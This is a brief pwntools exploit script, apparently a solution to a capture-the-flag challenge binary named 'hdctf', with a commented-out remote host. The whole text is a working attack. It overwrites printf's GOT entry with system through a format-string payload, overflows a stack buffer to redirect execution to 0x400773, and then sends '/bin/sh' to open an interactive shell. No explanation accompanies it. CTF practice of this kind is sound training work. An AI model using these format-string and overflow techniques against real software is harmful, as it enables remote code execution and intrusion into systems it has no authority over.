from pwn import *

context(arch='amd64', os = 'linux', log_level = 'debug')
io = process("./hdctf")
#io = remote("node4.anna.nssctf.cn",29002)

elf = ELF("./hdctf")

printf_got = elf.got["printf"]
system_plt = elf.plt["system"]

#gdb.attach(io)
payload = fmtstr_payload(6, {printf_got: system_plt})
io.recvuntil(b"name:")
io.send(payload)
payload = b"a" * (0x50+0x8) + p64(0x400773)
gdb.attach(io)
io.recvuntil(b"on !\n")
io.send(payload)

io.recvuntil(b"name:")
io.sendline(b"/bin/sh\x00")
io.interactive()
